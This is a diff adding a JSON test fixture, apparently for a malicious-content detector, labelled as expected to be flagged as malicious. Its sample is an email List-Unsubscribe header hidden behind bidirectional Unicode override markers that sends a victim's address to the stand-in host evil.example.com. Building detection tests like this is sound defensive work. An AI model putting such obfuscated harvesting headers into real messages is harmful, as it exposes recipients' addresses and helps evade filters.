@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::email-webfetch::123::unicode-variations::5",
+  "base_sample_id": "exp::email-webfetch::123",
+  "generator_id": "unicode-variations",
+  "generator_version": "1.0.0",
+  "seed": 1079107284,
+  "content": "‮List-Unsubscribe:‬ <http://evil.example.com/harvest?email=victim@target.example.com>\n",
+  "content_hash": "aedba098c149907f67026925916c4171041ff95fc56bdf649e2e91b59331ccd8",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "unicode:bidi-markers",
+  "difficulty": "advanced"
+}
